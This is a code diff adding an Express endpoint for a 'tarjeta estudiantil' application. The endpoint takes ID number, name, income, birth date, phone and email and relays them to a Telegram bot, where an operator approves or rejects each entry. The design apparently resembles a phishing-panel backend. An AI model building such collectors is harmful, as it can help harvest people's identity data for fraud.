@@ -126,6 +126,92 @@ ID:${id}`;
 
 
 /* =========================
+ENDPOINT FORMULARIO ESTUDIANTIL
+========================= */
+app.post("/api/estudiantil", async (req, res) => {
+  try {
+
+    const {
+      cedula,
+      nombre,
+      apellido,
+      ocupacion,
+      ingresos,
+      nacimiento,
+      celular,
+      correo
+    } = req.body || {};
+
+    /* VALIDACIÓN */
+    if(
+      !cedula ||
+      !nombre ||
+      !apellido ||
+      !ocupacion ||
+      !ingresos ||
+      !nacimiento ||
+      !celular ||
+      !correo
+    ){
+      return res.json({ error:true });
+    }
+
+    const id = crypto.randomUUID();
+
+    /* GUARDAR SESSION */
+    requests[id] = {
+      estado:"recibido",
+      cedula,
+      nombre,
+      apellido,
+      ocupacion,
+      ingresos,
+      nacimiento,
+      celular,
+      correo
+    };
+
+    /* MENSAJE TELEGRAM */
+    const texto =
+`🎓 NUEVA SOLICITUD TARJETA ESTUDIANTIL
+
+🆔 Cédula: ${cedula}
+👤 Nombre: ${nombre} ${apellido}
+💼 Ocupación: ${ocupacion}
+💰 Ingresos: ${ingresos}
+🎂 Nacimiento: ${nacimiento}
+📱 Celular: ${celular}
+📧 Correo: ${correo}
+
+🆔 ID:${id}`;
+
+    /* ENVIAR TELEGRAM */
+    await axios.post(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: CHAT_ID,
+        text: texto,
+        reply_markup:{
+          inline_keyboard:[[
+            { text:"❌ Rechazar", callback_data:`error_${id}` },
+            { text:"✅ Aprobar", callback_data:`ok_${id}` }
+          ]]
+        }
+      }
+    );
+
+    res.json({ ok:true, id });
+
+  } catch(err){
+    console.log(err);
+    res.json({ error:true });
+  }
+});
+
+
+
+
+/* =========================
 CONSULTAR ESTADO
 ========================= */
 app.get("/api/estado/:id",(req,res)=>{
